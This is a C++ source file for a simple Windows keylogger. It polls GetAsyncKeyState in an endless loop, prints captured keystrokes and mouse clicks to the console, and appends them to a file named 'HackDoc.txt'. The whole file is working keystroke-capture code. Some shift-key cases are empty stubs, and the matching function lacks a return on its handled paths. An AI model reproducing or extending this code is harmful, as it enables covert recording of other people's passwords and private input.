#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <time.h>


void WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	std::string _chars;
	doc_to << text;
	doc_to.close();
}

bool Key_is_Listed(WORD iKey)
{
	switch (iKey)
	{
	case VK_SPACE:
		std::cout << " ";
		WriteToFile(" ");
		break;

	case VK_F1:
		std::cout << " *F1* ";
		WriteToFile(" *F1* ");
		break;

	case 48:
			std::cout << "0";
			WriteToFile("0");
		break;

	case 49:
			std::cout << "1";
			WriteToFile("1");
		
		break;

	case 50:
			std::cout << "2";
			WriteToFile("2");
		break;

	case 51:
			std::cout << "3";
			WriteToFile("3");
		break;

	case 52:
			std::cout << "4";
			WriteToFile("4");
			break;

	case 53:
			std::cout << "5";
			WriteToFile("5");
		break;

	case 54:
			std::cout << "6";
			WriteToFile("6");
		break;

	case 55:
			std::cout << "7";
			WriteToFile("7");
		break;

	case 56:
			std::cout << "8";
			WriteToFile("8");
		break;

	case 57:
			std::cout << "9";
			WriteToFile("9");
		break;

	case 58:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			
		}
		break;

	case 59:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{

		}
		break;

	case 60:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{

		}
		break;

	case 61:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{

		}
		break;

	case 62:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{

		}
		break;

	case VK_RETURN:
		std::cout << "\n";
		WriteToFile("\n");
		break;

	case VK_LSHIFT:
		std::cout << " *Left_Shift* ";
		WriteToFile(" *Left_Shift* ");
		break;

	case VK_RSHIFT:
		std::cout << " *Right_Shift* ";
		WriteToFile(" *Right_Shift* ");
		break;

	case VK_BACK:
		std::cout << "\b";
		WriteToFile("\b");
		break;
		

	case VK_ESCAPE:
		std::cout << " *Esc* ";
		WriteToFile(" *Esc* ");
		break;

	case VK_UP:
		std::cout << " btn_up ";
		WriteToFile(" btn_up ");
		break;

	case VK_DOWN:
		std::cout << " btn_down ";
		WriteToFile(" btn_down ");
		break; 

	case VK_LEFT:
		std::cout << " btn_left ";
		WriteToFile(" btn_left ");
		break;

	case VK_RIGHT:
		std::cout << " btn_right ";
		WriteToFile(" btn_right ");
		break;

	case VK_CONTROL:
		std::cout << " btn_ctrl ";
		WriteToFile(" btn_ctrl ");
		break;

	case VK_INSERT:
		std::cout << " Insert ";
		WriteToFile(" Insert ");
		break;

	case VK_DELETE:
		std::cout << " Delete ";
		WriteToFile(" Delete ");
		break;

		

	case 'A':
		std::cout << " A ";
		WriteToFile(" A ");
		break;

	case VK_RBUTTON:
		std::cout << "*mouse_right*";
		WriteToFile("*mouse_right*");
		break;

	case VK_LBUTTON:
		std::cout << "*mouse_left*";
		WriteToFile("*mouse_left*");
		break;

	default: return false;
	}
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (Key_is_Listed(key) == false)
				{
					std::ofstream doc_to;
					doc_to.open("HackDoc.txt", std::fstream::app);
					doc_to << key;
					doc_to.close();
				}
			}
		}
	}

	system("pause");
	return 0;
}